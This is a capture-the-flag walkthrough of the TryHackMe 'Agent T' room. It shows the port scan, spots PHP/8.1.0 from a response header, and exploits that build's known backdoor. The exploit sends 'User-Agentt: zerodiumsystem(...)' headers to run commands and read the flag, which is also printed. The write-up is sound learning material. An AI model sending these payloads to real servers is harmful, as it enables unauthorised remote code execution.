---
created: 06-02-2026
---
- Challenge: [`Agent T`](https://tryhackme.com/room/agentt)

- Port scanning:

```bash
sudo nmap 10.66.132.58
```

```bash
Nmap scan report for 10.66.132.58
Host is up (0.19s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 776.55 seconds
```

- Accessing port `80`:

![[dashboard.png]]

- Intercepting traffic, we see the `X-Powered-By` HTTP response header:

```bash
X-Powered-By: PHP/8.1.0
```

- It turns that `PHP/8.1.0` has an RCE [backdoor](https://www.exploit-db.com/exploits/49933). This version is not an official PHP release but a malicious commit injected into the Git repository (it was quickly discovered and removed).
- You can execute commands by sending a specially crafted `User-Agentt` header (note the double `t`) containing PHP code prefixed with `zerodium`.

No need in any scripts; you can just inject the header and commands manually:

```bash
User-Agentt: zerodiumsystem('id');
```

![[backdoor.png]]

We don't even need a reverse shell. Just find the flag and output it:

```bash
User-Agentt: zerodiumsystem('cat /flag.txt');
```

```bash
flag{4127d0530abf16d6d23973e3df8dbecb}
```

![[flag.png]]

